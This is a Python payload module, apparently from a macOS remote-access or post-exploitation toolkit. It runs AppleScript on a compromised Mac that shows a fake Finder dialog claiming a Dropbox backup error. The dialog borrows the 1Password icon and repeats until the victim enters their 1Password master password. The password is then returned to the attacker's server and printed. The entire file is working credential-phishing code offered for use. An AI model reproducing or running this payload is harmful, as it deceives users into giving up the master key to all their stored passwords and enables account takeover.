import time

class payload:
    def __init__(self):
        self.name = "1prompt"
        self.description = "prompt user to type 1Password password"
        self.type = "applescript"
        self.id = 124

    def run(self,session,server,command):
        payload = """
tell application "Finder"
activate
set myprompt to "An error occured while trying to backup your encrypted data to Dropbox. Enter your master password to backup your data."

set ans to "Cancel"

repeat
	try
		set d_returns to display dialog myprompt default answer "" with hidden answer buttons {"Cancel", "OK"} default button "OK" with icon path to resource "app-icon-round.icns" in bundle "/Applications/1Password.app"
		set ans to button returned of d_returns
		set mypass to text returned of d_returns
		if mypass > "" then exit repeat
	end try
end repeat

try
	do shell script "echo " & quoted form of mypass
end try
end tell
"""
        password = server.sendCommand("prompt",payload,self.type,session.conn)
        #display response
        print server.h.COLOR_INFO+"[*]  "+server.h.WHITE+"Response: "+server.h.GREEN+password+server.h.WHITE
